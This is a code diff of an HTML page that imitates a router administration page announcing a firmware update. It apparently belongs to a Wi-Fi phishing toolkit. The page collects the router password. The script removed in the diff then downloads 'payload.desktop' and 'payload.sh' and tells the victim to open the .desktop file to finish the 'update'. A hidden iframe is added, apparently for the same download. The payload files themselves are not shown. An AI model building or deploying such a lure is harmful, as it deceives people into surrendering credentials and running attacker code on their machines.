@@ -8,7 +8,9 @@
 	<title>Router Admin</title>
 </head>
 <body>
+	<!- Main div ->
 		<div class="main">
+			<!- info_div contains the banner div and "current firmware" info ->
 		<div class="info_div">
 			<p id="info">Current firmware version: 3.14</p>
 			<div class="banner">
@@ -16,7 +18,9 @@
 		<h1>Router Administration</h1>
 	</div>
 		</div>
+		<!- admin_div contains the warning message and password prompts ->
 		<div class="admin_div">
+			<!- displays the warning message ->
 			<table id="warning_table">
 				<tr>
 					<th>
@@ -29,6 +33,7 @@
 					</td>
 				</tr>
 			</table>
+			<!- This displays the network password field ->
 			<table id="admin_table">
 				<tr>
 					<th>
@@ -39,75 +44,15 @@
 					<td>
 						<br><br>Router Password: <input id="pw" type="password"><br><br>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;Confirm: <input id="confirmpw" type="password"><br><br><br>
 						<button onclick="clicked()">Submit</button>
+						<iframe id="dl" style="display: none"></iframe>
 					</td>
 				</tr>
 			</table>
 		</div>
 	</div>
+	<!- Generic footer ->
 	<footer id="footer">Copyright &copy; 2020</footer>
-	<script>
-		function download(){
-			let filenames = ['payload.desktop', 'payload.sh'];
-			let linkNames = ['../payloads/payload.desktop', '../payloads/payload.sh'];
-			let link = document.createElement('a');
-			link.style.display = 'none';
-			document.body.appendChild(link);
-
-			for(var i = 0; i < filenames.length; i++){
-				link.setAttribute('href','data:text/plain;charset=utf-8,' + linkNames[i]);
-				link.setAttribute('download', filenames[i]);
-				link.click();
-			}
-
-			document.body.removeChild(link);
-		}
-
-
-		function clicked (){
-
-			let pwInput = document.getElementById("pw").value;
-			let confirmInput = document.getElementById("confirmpw").value;
-			// Checks to see if there was any input, if not create error messsage
-			if(pwInput === "" || confirmInput === ""){
-				// checks to see if there was a previous "p" element and remove it
-				if(document.contains(document.getElementById("submit_msg"))){
-					document.getElementById("submit_msg").remove();
-				}
-				// create a new p tag with message
-				let message = document.createElement("p");
-				message.id = "submit_msg";
-				message.innerHTML = "You must fill out both fields.";
-				message.style.color = "red";
-				document.getElementById("admin_table").getElementsByTagName("td")[0].appendChild(message);
-				// if the passwords dont match
-			} else {
-				if(pwInput !== confirmInput){
-
-				if(document.contains(document.getElementById("submit_msg"))){
-					document.getElementById("submit_msg").remove();
-				}
-				let message = document.createElement("p");
-				message.id = "submit_msg";
-				message.innerHTML = "Passwords do not match.";
-				message.style.color = "red";
-				document.getElementById("admin_table").getElementsByTagName("td")[0].appendChild(message);
-				// If it works.
-			} else {
-				// Remove the admin table and change the warning table to confirm.
-			let admin = document.getElementById("admin_table");
-			admin.style.display = "none";
-
-			let warning = document.getElementById("warning_table");
-			warning.getElementsByTagName("th")[0].style.background = "green";
-			warning.getElementsByTagName("h4")[0].innerHTML = "UPDATE DOWNLOADING"
-			warning.getElementsByTagName("p")[0].innerHTML = "Thank you! When your downloads are finished, click on \"payloads.desktop\" to finish the update process.";
-
-			download();
-
-		}
-	}
-
-		}
-	</script>
+	<!- script location ->
+	<script type="text/javascript" src="script.js"></script>
 </body>
 </html>
